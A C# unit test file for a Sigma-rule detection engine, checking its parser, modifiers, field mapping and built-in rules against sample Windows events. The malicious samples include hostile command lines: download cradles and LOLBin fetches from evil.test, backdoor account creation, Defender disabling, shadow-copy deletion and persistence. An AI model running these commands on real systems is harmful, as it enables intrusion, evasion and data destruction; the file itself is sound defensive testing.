using System.Diagnostics;
using System.Text;
using FluentAssertions;
using Sentinel.Detection.Sigma;
using Sentinel.Shared.Models;
using Xunit;

namespace Sentinel.Detection.Tests;

public sealed class SigmaEngineTests
{
    private static readonly string RepoRulesDir = LocateSigmaRulesDirectory();

    private static string LocateSigmaRulesDirectory()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null)
        {
            var candidate = Path.Combine(dir.FullName, "rules", "sigma");
            if (Directory.Exists(candidate))
                return candidate;
            dir = dir.Parent;
        }
        throw new DirectoryNotFoundException("Impossible de localiser le repertoire rules/sigma depuis " + AppContext.BaseDirectory);
    }

    private static SecurityEvent MakeProcessEvent(
        string image,
        string cmdLine = "",
        string? parentImage = null,
        string user = @"CORP\alice",
        string eventType = EventTypes.ProcessStart,
        Dictionary<string, string>? extra = null)
    {
        var attrs = new Dictionary<string, string>
        {
            [AttributeKeys.ProcessPath] = image,
            [AttributeKeys.ProcessName] = Path.GetFileName(image),
            [AttributeKeys.CommandLine] = cmdLine
        };
        if (parentImage is not null)
        {
            attrs[AttributeKeys.ParentProcessPath] = parentImage;
            attrs[AttributeKeys.ParentProcessName] = Path.GetFileName(parentImage);
        }
        if (extra is not null)
        {
            foreach (var kv in extra)
                attrs[kv.Key] = kv.Value;
        }
        return SecurityEvent.Create("host-01", user, EventCategory.Process, eventType, image, attrs);
    }

    private static SecurityEvent MakeFileEvent(string filePath, string eventType = EventTypes.FileCreated) =>
        SecurityEvent.Create("host-01", @"CORP\alice", EventCategory.File, eventType, filePath,
            new Dictionary<string, string>
            {
                [AttributeKeys.FilePath] = filePath,
                [AttributeKeys.FileName] = Path.GetFileName(filePath)
            });

    private static SecurityEvent MakeNetworkEvent(
        string remoteIp,
        int remotePort = 443,
        string? domain = null,
        string eventType = EventTypes.NetworkConnection,
        string? localIp = "192.168.1.50")
    {
        var attrs = new Dictionary<string, string>
        {
            [AttributeKeys.RemoteIp] = remoteIp,
            [AttributeKeys.RemotePort] = remotePort.ToString(),
            [AttributeKeys.LocalIp] = localIp ?? "192.168.1.50"
        };
        if (domain is not null)
            attrs[AttributeKeys.Domain] = domain;

        return SecurityEvent.Create("host-01", @"CORP\alice", EventCategory.Network, eventType, domain ?? remoteIp, attrs);
    }

    private static SecurityEvent MakeRegistryEvent(string targetObject, string details) =>
        SecurityEvent.Create("host-01", @"CORP\alice", EventCategory.Installation, EventTypes.StartupEntryAdded, targetObject,
            new Dictionary<string, string>
            {
                [AttributeKeys.TargetObject] = targetObject,
                [AttributeKeys.RegistryKey] = targetObject,
                [AttributeKeys.RegistryValue] = details
            });

    private static SecurityEvent MakeScriptBlockEvent(string scriptText) =>
        SecurityEvent.Create("host-01", @"CORP\alice", EventCategory.Script, EventTypes.PowerShellScriptBlock, "powershell.exe",
            new Dictionary<string, string>
            {
                ["ScriptBlockText"] = scriptText,
                [AttributeKeys.WindowsEventId] = "4104"
            });

    // =========================================================================
    // 1. Parseur Sigma, modificateurs & AST de conditions (Tests 1-20)
    // =========================================================================

    [Fact]
    public void Parser_ExtractsMetadataAndMitreAttackFromTags()
    {
        const string yaml = """
            title: Test MITRE Extraction
            id: test-mitre-001
            status: stable
            description: Verifie l'extraction MITRE
            author: Sentinel Test
            level: high
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    Image|endswith: '\cmd.exe'
                condition: selection
            tags:
                - attack.execution
                - attack.defense_evasion
                - attack.t1059.003
                - attack.T1218.005
                - cve.2024.0001
            """;

        var parser = new SigmaRuleParser();
        var rule = parser.Parse(yaml, "test.yml");

        rule.Id.Should().Be("test-mitre-001");
        rule.Title.Should().Be("Test MITRE Extraction");
        rule.Level.Should().Be("high");
        rule.Score.Should().Be(80);
        rule.LogSource.Product.Should().Be("windows");
        rule.LogSource.Category.Should().Be("process_creation");
        rule.MitreTechniques.Should().BeEquivalentTo(new[] { "T1059.003", "T1218.005" });
        rule.MitreTactics.Should().BeEquivalentTo(new[] { "execution", "defense_evasion" });
        rule.Enabled.Should().BeTrue();
    }

    [Fact]
    public void Modifier_ExactAndWildcards_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: Wildcard Path Match
            id: mod-wildcard
            level: medium
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    Image: 'C:\Users\*\Downloads\*.exe'
                condition: selection
            """);

        engine.Evaluate(MakeProcessEvent(@"C:\Users\bob\Downloads\payload.exe")).Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\Users\bob\Documents\payload.exe")).Should().BeEmpty();
    }

    [Fact]
    public void Modifier_ContainsStartsWithEndsWith_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: String Position Modifiers
            id: mod-pos
            level: medium
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    Image|startswith: 'C:\Windows\'
                    Image|endswith: '\cmd.exe'
                    CommandLine|contains: 'whoami'
                condition: selection
            """);

        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\cmd.exe", "cmd.exe /c whoami /all"))
            .Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"D:\Tools\cmd.exe", "cmd.exe /c whoami"))
            .Should().BeEmpty();
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\cmd.exe", "cmd.exe /c dir"))
            .Should().BeEmpty();
    }

    [Fact]
    public void Modifier_All_RequiresEveryTokenInList()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: All Modifier Test
            id: mod-all
            level: high
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    CommandLine|contains|all:
                        - 'net'
                        - 'user'
                        - '/add'
                condition: selection
            """);

        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\net.exe", "net user backdoor P@ss123 /add"))
            .Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\net.exe", "net user alice"))
            .Should().BeEmpty();
    }

    [Fact]
    public void Modifier_Cased_EnforcesCaseSensitivity()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: Cased Modifier Test
            id: mod-cased
            level: low
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    CommandLine|contains|cased: 'Invoke-AuditCheck'
                condition: selection
            """);

        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", "Invoke-AuditCheck -Verbose"))
            .Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", "invoke-auditcheck -Verbose"))
            .Should().BeEmpty();
    }

    [Theory]
    [InlineData("powershell.exe -enc SQBFAFgA", true)]
    [InlineData("powershell.exe /enc SQBFAFgA", true)]
    [InlineData("powershell.exe \u2013enc SQBFAFgA", true)]
    [InlineData("powershell.exe \u2014enc SQBFAFgA", true)]
    [InlineData("powershell.exe -File script.ps1", false)]
    public void Modifier_WinDash_MatchesAllFourDashVariants(string cmdLine, bool shouldMatch)
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: WinDash Test
            id: mod-windash
            level: high
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    CommandLine|contains|windash: ' -enc '
                condition: selection
            """);

        var matches = engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", cmdLine));
        matches.Any().Should().Be(shouldMatch);
    }

    [Fact]
    public void Modifier_WinDashCombinedWithAll_RequiresEachSwitchInAnyDashForm()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: WinDash All Test
            id: mod-windash-all
            level: high
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    CommandLine|contains|windash|all:
                        - ' -nop'
                        - ' -w hidden'
                condition: selection
            """);

        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", "powershell.exe /nop \u2013w hidden -c calc"))
            .Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", "powershell.exe -nop -c calc"))
            .Should().BeEmpty();
    }

    [Fact]
    public void Modifier_Base64_MatchesUtf8AndUtf16LeEncodings()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: Base64 UTF8 and UTF16LE
            id: mod-b64
            level: high
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    CommandLine|base64|contains: 'Invoke-Expression'
                condition: selection
            """);

        var utf8 = Convert.ToBase64String(Encoding.UTF8.GetBytes("Invoke-Expression"));
        var utf16 = Convert.ToBase64String(Encoding.Unicode.GetBytes("Invoke-Expression"));

        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", $"powershell -enc {utf8}"))
            .Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", $"powershell -enc {utf16}"))
            .Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", "powershell -c Get-Date"))
            .Should().BeEmpty();
    }

    [Theory]
    [InlineData("", false)]
    [InlineData("A", false)]
    [InlineData("AB", false)]
    [InlineData("", true)]
    [InlineData("X", true)]
    [InlineData("XY", true)]
    public void Modifier_Base64Offset_MatchesAllByteOffsetsInUtf8AndUtf16Le(string prefix, bool useUtf16Le)
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: Base64Offset Shifts
            id: mod-b64offset
            level: high
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    CommandLine|base64offset|contains: 'DownloadString'
                condition: selection
            """);

        var payload = prefix + "DownloadString('http://evil.test/a.ps1')";
        var encoded = Convert.ToBase64String(useUtf16Le
            ? Encoding.Unicode.GetBytes(payload)
            : Encoding.UTF8.GetBytes(payload));

        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", $"powershell -enc {encoded}"))
            .Should().ContainSingle();
    }

    [Fact]
    public void Modifier_Base64Offset_NegativeOnUnrelatedPayload()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: Base64Offset Negative
            id: mod-b64offset-neg
            level: high
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    CommandLine|base64offset|contains: 'DownloadString'
                condition: selection
            """);

        var benign = Convert.ToBase64String(Encoding.Unicode.GetBytes("Write-Output 'Hello World'"));
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", $"powershell -enc {benign}"))
            .Should().BeEmpty();
    }

    [Fact]
    public void Modifier_Regex_PositiveNegativeAndReDoSProtection()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: Regex Test
            id: mod-re
            level: medium
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    CommandLine|re: 'https?://\d{1,3}(?:\.\d{1,3}){3}/[a-z0-9]+\.exe'
                condition: selection
            """);

        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\curl.exe", "curl http://185.10.20.30/dropper1.exe"))
            .Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\curl.exe", "curl https://microsoft.com/index.html"))
            .Should().BeEmpty();

        // Protection anti-ReDoS : une regex catastrophique doit expirer proprement (< 500 ms) sans exception
        using var redosEngine = new SigmaEngine();
        redosEngine.LoadRuleYaml("""
            title: ReDoS Protection
            id: mod-redos
            level: low
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    CommandLine|re: '^(a+)+$'
                condition: selection
            """);

        var sw = Stopwatch.StartNew();
        var res = redosEngine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\cmd.exe", new string('a', 40) + "!"));
        sw.Stop();
        res.Should().BeEmpty();
        sw.ElapsedMilliseconds.Should().BeLessThan(1500);
    }

    [Fact]
    public void Modifier_Cidr_MatchesIpv4AndIpv6Subnets()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: CIDR External Connection
            id: mod-cidr
            level: low
            logsource:
                product: windows
                category: network_connection
            detection:
                selection:
                    DestinationIp|cidr:
                        - '10.0.0.0/8'
                        - '192.168.10.0/24'
                        - 'fe80::/10'
                condition: selection
            """);

        engine.Evaluate(MakeNetworkEvent("10.42.1.7")).Should().ContainSingle();
        engine.Evaluate(MakeNetworkEvent("192.168.10.200")).Should().ContainSingle();
        engine.Evaluate(MakeNetworkEvent("fe80::1")).Should().ContainSingle();
        engine.Evaluate(MakeNetworkEvent("8.8.8.8")).Should().BeEmpty();
        engine.Evaluate(MakeNetworkEvent("not-an-ip")).Should().BeEmpty();
    }

    [Fact]
    public void Selection_ListOfMapsAndKeywords_MatchCorrectly()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: List Of Maps And Keywords
            id: sel-multi
            level: medium
            logsource:
                product: windows
                category: process_creation
            detection:
                sel_maps:
                    - Image|endswith: '\cmd.exe'
                      CommandLine|contains: 'calc'
                    - Image|endswith: '\powershell.exe'
                      CommandLine|contains: 'audit_alpha'
                sel_keywords:
                    - 'audit_beta'
                    - 'audit_gamma'
                condition: sel_maps or sel_keywords
            """);

        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\cmd.exe", "cmd /c calc.exe")).Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", "run audit_beta")).Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\cmd.exe", "cmd /c audit_alpha")).Should().BeEmpty();
    }

    [Fact]
    public void Selection_NullValue_MatchesMissingFieldOnly()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: Null ParentImage
            id: sel-null
            level: low
            logsource:
                product: windows
                category: process_creation
            detection:
                selection:
                    Image|endswith: '\orphan.exe'
                    ParentImage: null
                condition: selection
            """);

        engine.Evaluate(MakeProcessEvent(@"C:\Temp\orphan.exe", parentImage: null)).Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\Temp\orphan.exe", parentImage: @"C:\Windows\explorer.exe")).Should().BeEmpty();
    }

    [Fact]
    public void Condition_ParenthesesAndOperatorPrecedence()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: Condition Precedence
            id: cond-prec
            level: medium
            logsource:
                product: windows
                category: process_creation
            detection:
                sel_a:
                    Image|endswith: '\a.exe'
                sel_b:
                    Image|endswith: '\b.exe'
                sel_c:
                    CommandLine|contains: 'trigger'
                condition: (sel_a or sel_b) and sel_c
            """);

        engine.Evaluate(MakeProcessEvent(@"C:\a.exe", "trigger")).Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\b.exe", "trigger")).Should().ContainSingle();
        engine.Evaluate(MakeProcessEvent(@"C:\a.exe", "benign")).Should().BeEmpty();
    }

    [Fact]
    public void Condition_OneOfSelectionWildcard_AndAllOfSelectionWildcard()
    {
        using var engine = new SigmaEngine();
        engine.LoadRuleYaml("""
            title: Quantifiers OneOf And AllOf
            id: cond-quant
            level: high
            logsource:
                product: windows
                category: process_creation
            detection:
                selection_1:
                    Image|endswith: '\powershell.exe'
                selection_2:
                    CommandLine|contains: 'bypass'
                filter_a:
                    User|contains: 'SYSTEM'
                filter_b:
                    ParentImage|endswith: '\trusted.exe'
                condition: all of selection_* and not filter_*
            """);

        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", "-ep bypass", @"C:\Windows\explorer.exe", @"CORP\alice"))
            .Should().ContainSingle();
        // Manque selection_2
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", "-version", @"C:\Windows\explorer.exe", @"CORP\alice"))
            .Should().BeEmpty();
        // Exclu par filter_a
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", "-ep bypass", @"C:\Windows\explorer.exe", @"NT AUTHORITY\SYSTEM"))
            .Should().BeEmpty();
        // Exclu par filter_b
        engine.Evaluate(MakeProcessEvent(@"C:\Windows\System32\powershell.exe", "-ep bypass", @"C:\Program Files\trusted.exe", @"CORP\alice"))
            .Should().BeEmpty();
    }

    [Fact]
    public void Condition_OneOfThemAndAllOfThem()
    {
        using var engineOne = new SigmaEngine();
        engineOne.LoadRuleYaml("""
            title: One Of Them
            id: cond-1-them
            level: medium
            logsource:
                product: windows
                category: process_creation
            detection:
                s1:
                    CommandLine|contains: 'alpha'
                s2:
                    CommandLine|contains: 'beta'
                condition: 1 of them
            """);

        engineOne.Evaluate(MakeProcessEvent(@"C:\a.exe", "alpha")).Should().ContainSingle();
        engineOne.Evaluate(MakeProcessEvent(@"C:\a.exe", "gamma")).Should().BeEmpty();

        using var engineAll = new SigmaEngine();
        engineAll.LoadRuleYaml("""
            title: All Of Them
            id: cond-all-them
            level: medium
            logsource:
                product: windows
                category: process_creation
            detection:
                s1:
                    CommandLine|contains: 'alpha'
                s2:
                    CommandLine|contains: 'beta'
                condition: all of them
            """);

        engineAll.Evaluate(MakeProcessEvent(@"C:\a.exe", "alpha beta")).Should().ContainSingle();
        engineAll.Evaluate(MakeProcessEvent(@"C:\a.exe", "alpha only")).Should().BeEmpty();
    }

    // =========================================================================
    // 2. SigmaFieldMapper : table documentee et resolution des 20 champs
    // =========================================================================

    [Fact]
    public void FieldMapper_ExposesAll20StandardSigmaFields()
    {
        string[] requiredFields =
        [
            "Image", "OriginalFileName", "CommandLine", "ParentImage", "ParentCommandLine",
            "TargetFilename", "DestinationIp", "DestinationPort", "DestinationHostname",
            "QueryName", "SourceIp", "User", "TargetObject", "Details", "EventID",
            "ScriptBlockText", "Hashes", "Product", "Category", "Service"
        ];

        foreach (var field in requiredFields)
        {
            SigmaFieldMapper.FieldMappings.Should().ContainKey(field);
            SigmaFieldMapper.FieldMappings[field].Description.Should().NotBeNullOrWhiteSpace();
            SigmaFieldMapper.FieldMappings[field].SentinelTargets.Should().NotBeEmpty();
        }
    }

    [Fact]
    public void FieldMapper_MapsAllStandardFieldsAccurately()
    {
        var procEvt = MakeProcessEvent(
            @"C:\Windows\System32\powershell.exe",
            "powershell.exe -enc AAAA",
            @"C:\Windows\explorer.exe",
            @"CORP\jdoe",
            extra: new Dictionary<string, string>
            {
                ["parent.cmdline"] = "explorer.exe",
                [AttributeKeys.SysmonHashes] = "SHA256=deadbeef"
            });

        SigmaFieldMapper.GetFieldValue(procEvt, "Image").Should().Be(@"C:\Windows\System32\powershell.exe");
        SigmaFieldMapper.GetFieldValue(procEvt, "OriginalFileName").Should().Be("powershell.exe");
        SigmaFieldMapper.GetFieldValue(procEvt, "CommandLine").Should().Be("powershell.exe -enc AAAA");
        SigmaFieldMapper.GetFieldValue(procEvt, "ParentImage").Should().Be(@"C:\Windows\explorer.exe");
        SigmaFieldMapper.GetFieldValue(procEvt, "ParentCommandLine").Should().Be("explorer.exe");
        SigmaFieldMapper.GetFieldValue(procEvt, "User").Should().Be(@"CORP\jdoe");
        SigmaFieldMapper.GetFieldValue(procEvt, "Hashes").Should().Be("SHA256=deadbeef");
        SigmaFieldMapper.GetFieldValue(procEvt, "Product").Should().Be("windows");
        SigmaFieldMapper.GetFieldValue(procEvt, "Category").Should().Be("process_creation");
        SigmaFieldMapper.GetFieldValue(procEvt, "EventID").Should().Be("1");

        var dnsEvt = MakeNetworkEvent("1.2.3.4", 53, "evil.example.org", EventTypes.DnsQuery, "10.0.0.5");
        SigmaFieldMapper.GetFieldValue(dnsEvt, "DestinationIp").Should().Be("1.2.3.4");
        SigmaFieldMapper.GetFieldValue(dnsEvt, "DestinationPort").Should().Be("53");
        SigmaFieldMapper.GetFieldValue(dnsEvt, "DestinationHostname").Should().Be("evil.example.org");
        SigmaFieldMapper.GetFieldValue(dnsEvt, "QueryName").Should().Be("evil.example.org");
        SigmaFieldMapper.GetFieldValue(dnsEvt, "SourceIp").Should().Be("10.0.0.5");

        var regEvt = MakeRegistryEvent(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Evil", @"C:\Temp\evil.exe");
        SigmaFieldMapper.GetFieldValue(regEvt, "TargetObject").Should().Contain(@"\CurrentVersion\Run\Evil");
        SigmaFieldMapper.GetFieldValue(regEvt, "Details").Should().Be(@"C:\Temp\evil.exe");

        var fileEvt = MakeFileEvent(@"C:\Users\alice\Downloads\doc.pdf.exe");
        SigmaFieldMapper.GetFieldValue(fileEvt, "TargetFilename").Should().Be(@"C:\Users\alice\Downloads\doc.pdf.exe");

        var psEvt = MakeScriptBlockEvent("Invoke-Expression $payload");
        SigmaFieldMapper.GetFieldValue(psEvt, "ScriptBlockText").Should().Be("Invoke-Expression $payload");
        SigmaFieldMapper.GetFieldValue(psEvt, "Service").Should().Be("powershell");
        SigmaFieldMapper.GetFieldValue(psEvt, "EventID").Should().Be("4104");
    }

    // =========================================================================
    // 3. Chargement et validation des 14 regles MIT originales (positif & negatif)
    // =========================================================================

    [Fact]
    public void BuiltInRules_All14MitRulesLoadWithZeroErrors()
    {
        using var engine = new SigmaEngine();
        var result = engine.LoadFromDirectory(RepoRulesDir);

        result.Errors.Should().BeEmpty();
        result.LoadedCount.Should().Be(14);
        engine.RuleCount.Should().Be(14);
        engine.EnabledRuleCount.Should().Be(14);
        engine.Rules.Should().OnlyContain(r => r.License.Equals("MIT", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Rule01_PowerShellEncodedCommand_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var malicious = MakeProcessEvent(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe /enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==");
        engine.Evaluate(malicious).Should().Contain(m => m.RuleId == "6a100001-5e77-4b21-9c01-000000000001");

        var benign = MakeProcessEvent(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -ExecutionPolicy Bypass -File backup.ps1");
        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100001-5e77-4b21-9c01-000000000001");
    }

    [Fact]
    public void Rule02_PowerShellDownloadCradle_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var malicious = MakeProcessEvent(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.test/stage.ps1')\"");
        engine.Evaluate(malicious).Should().Contain(m => m.RuleId == "6a100002-5e77-4b21-9c02-000000000002");

        var benign = MakeProcessEvent(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe -c \"Get-Process | Sort-Object CPU -Descending\"");
        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100002-5e77-4b21-9c02-000000000002");
    }

    [Fact]
    public void Rule03_LolbinMshta_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var malicious = MakeProcessEvent(@"C:\Windows\System32\mshta.exe", "mshta.exe https://evil.test/payload.hta");
        engine.Evaluate(malicious).Should().Contain(m => m.RuleId == "6a100003-5e77-4b21-9c03-000000000003");

        var benign = MakeProcessEvent(@"C:\Windows\System32\mshta.exe", @"mshta.exe C:\Program Files\Corp\help.hta");
        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100003-5e77-4b21-9c03-000000000003");
    }

    [Fact]
    public void Rule04_LolbinCertutil_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var malicious = MakeProcessEvent(@"C:\Windows\System32\certutil.exe", "certutil.exe -urlcache -split -f http://evil.test/bin.exe C:\\Temp\\bin.exe");
        engine.Evaluate(malicious).Should().Contain(m => m.RuleId == "6a100004-5e77-4b21-9c04-000000000004");

        var benign = MakeProcessEvent(@"C:\Windows\System32\certutil.exe", "certutil.exe -verify C:\\Certs\\root.cer");
        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100004-5e77-4b21-9c04-000000000004");
    }

    [Fact]
    public void Rule05_LolbinRegsvr32Rundll32Bitsadmin_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var regsvr = MakeProcessEvent(@"C:\Windows\System32\regsvr32.exe", "regsvr32.exe /s /n /u /i:http://evil.test/file.sct scrobj.dll");
        var rundll = MakeProcessEvent(@"C:\Windows\System32\rundll32.exe", @"rundll32.exe C:\Users\alice\AppData\Local\Temp\evil.dll,Entry");
        var bits = MakeProcessEvent(@"C:\Windows\System32\bitsadmin.exe", "bitsadmin.exe /transfer myjob http://evil.test/a.exe C:\\Temp\\a.exe");
        var benign = MakeProcessEvent(@"C:\Windows\System32\regsvr32.exe", @"regsvr32.exe /s C:\Windows\System32\atl.dll");

        engine.Evaluate(regsvr).Should().Contain(m => m.RuleId == "6a100005-5e77-4b21-9c05-000000000005");
        engine.Evaluate(rundll).Should().Contain(m => m.RuleId == "6a100005-5e77-4b21-9c05-000000000005");
        engine.Evaluate(bits).Should().Contain(m => m.RuleId == "6a100005-5e77-4b21-9c05-000000000005");
        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100005-5e77-4b21-9c05-000000000005");
    }

    [Fact]
    public void Rule06_ExecutionFromTempOrDownloads_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var malicious = MakeProcessEvent(@"C:\Users\alice\Downloads\dropper.exe", "dropper.exe");
        engine.Evaluate(malicious).Should().Contain(m => m.RuleId == "6a100006-5e77-4b21-9c06-000000000006");

        var benign = MakeProcessEvent(@"C:\Program Files\MyApp\myapp.exe", "myapp.exe");
        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100006-5e77-4b21-9c06-000000000006");
    }

    [Fact]
    public void Rule07_DoubleFileExtension_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var maliciousFile = MakeFileEvent(@"C:\Users\alice\Downloads\facture_2026.pdf.exe");
        engine.Evaluate(maliciousFile).Should().Contain(m => m.RuleId == "6a100007-5e77-4b21-9c07-000000000007");

        var benignFile = MakeFileEvent(@"C:\Users\alice\Downloads\facture_2026.pdf");
        engine.Evaluate(benignFile).Should().NotContain(m => m.RuleId == "6a100007-5e77-4b21-9c07-000000000007");
    }

    [Fact]
    public void Rule08_SchtasksCreation_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var malicious = MakeProcessEvent(
            @"C:\Windows\System32\schtasks.exe",
            @"schtasks.exe /create /sc onlogon /tn Updater /tr ""powershell.exe -w hidden -f C:\Temp\p.ps1""");
        engine.Evaluate(malicious).Should().Contain(m => m.RuleId == "6a100008-5e77-4b21-9c08-000000000008");

        var benign = MakeProcessEvent(@"C:\Windows\System32\schtasks.exe", "schtasks.exe /query /fo TABLE");
        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100008-5e77-4b21-9c08-000000000008");
    }

    [Fact]
    public void Rule09_RegistryRunPersistence_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var malicious = MakeRegistryEvent(
            @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SyncHelper",
            @"C:\Users\alice\AppData\Roaming\sync.exe");
        engine.Evaluate(malicious).Should().Contain(m => m.RuleId == "6a100009-5e77-4b21-9c09-000000000009");

        var benignTrusted = MakeRegistryEvent(
            @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive",
            @"C:\Users\alice\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background");
        engine.Evaluate(benignTrusted).Should().NotContain(m => m.RuleId == "6a100009-5e77-4b21-9c09-000000000009");

        var benignOtherKey = MakeRegistryEvent(@"HKCU\Software\Notepad\Font", "Consolas");
        engine.Evaluate(benignOtherKey).Should().NotContain(m => m.RuleId == "6a100009-5e77-4b21-9c09-000000000009");
    }

    [Fact]
    public void Rule10_DefenderTamperingAndExclusions_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var disableRt = MakeProcessEvent(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true");
        var addExclusion = MakeProcessEvent(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe Add-MpPreference /ExclusionPath C:\\Temp");
        var defenderEvt = SecurityEvent.Create(
            "host-01", "SYSTEM", EventCategory.Defender, EventTypes.DefenderRealtimeDisabled, "WinDefend");
        var benign = MakeProcessEvent(
            @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "powershell.exe Get-MpComputerStatus");

        engine.Evaluate(disableRt).Should().Contain(m => m.RuleId == "6a100010-5e77-4b21-9c10-000000000010");
        engine.Evaluate(addExclusion).Should().Contain(m => m.RuleId == "6a100010-5e77-4b21-9c10-000000000010");
        engine.Evaluate(defenderEvt).Should().Contain(m => m.RuleId == "6a100010-5e77-4b21-9c10-000000000010");
        engine.Evaluate(benign).Should().NotContain(m => m.RuleId == "6a100010-5e77-4b21-9c10-000000000010");
    }

    [Fact]
    public void Rule11_ShadowCopyDeletion_PositiveAndNegative()
    {
        using var engine = new SigmaEngine();
        engine.LoadFromDirectory(RepoRulesDir);

        var malicious = MakeProcessEvent(@"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet");
        engine.Evaluate(malicious).Should().Contain(m => m.RuleId == "6a100011-5e77-4b21-9c11-000000000011");

        var benign = MakeProcessEvent(@"C:\Windows\System32\vssadmin.exe", "vssadmin.exe list shadows");
